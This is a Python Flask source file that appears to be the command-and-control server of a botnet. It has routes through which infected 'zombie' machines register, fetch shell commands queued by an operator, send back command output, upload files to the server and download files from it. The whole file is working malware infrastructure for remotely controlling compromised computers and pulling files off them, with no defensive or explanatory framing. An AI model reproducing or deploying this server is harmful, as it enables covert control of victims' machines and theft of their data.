from flask import request, render_template, send_file, Flask # used by flask
import ast, os
from server_classes import *
app = Flask(__name__)

@app.route('/sendcmd/<cmd>')
def sendcmd(cmd):
    """ recieve command from user """
    x = w.shell.run(cmd, w.zombie_list)

    return x

@app.route('/<guid>/add')
def add(guid):
    """ add new zombie """
    z = Zombie(guid) # create new zombie
    w.zombie_list.add_zombie(z) # insert it to zombie list

    return "200"

@app.route('/<guid>/index.html')
def index(guid):
    """ send command list to execute """
    w.zombie_list.sync_cmds(guid)
    return send_file(guid+"/index.html")

@app.route('/<guid>/putfile/<filename>', methods=['GET', 'POST'])
def download_file(guid, filename):
    """ handle putfile command (zombie transfer file to server)"""
    if request.method == 'POST':
        f = request.files[filename]
        f.save(guid + "/" + filename)

@app.route('/<guid>/getfile/<filename>')
def upload_file(guid, filename):
    """ handle getfile command (server transfer file to zombie)"""

    return send_file(guid + "/" + filename)

@app.route('/<guid>/cmdlst', methods=['GET', 'POST'])
def cmdlst(guid):
    """ recieve done command list and save it ([["%cmd%", %id%, %output%], ]) """
    data = request.form.get('lis')
    lis = ast.literal_eval(data)
    f = open(guid+ "/list.txt", "w")
    f.write(str(lis))

    return "200"

@app.route('/<guid>/remove')
def remove(guid):
    """ remove zombie """
    w.zombie_list.del_zombie(w.zombie_list.get_zombie(guid))

    return "200"

w = WebServer()
app.run()#ssl_context='adhoc')
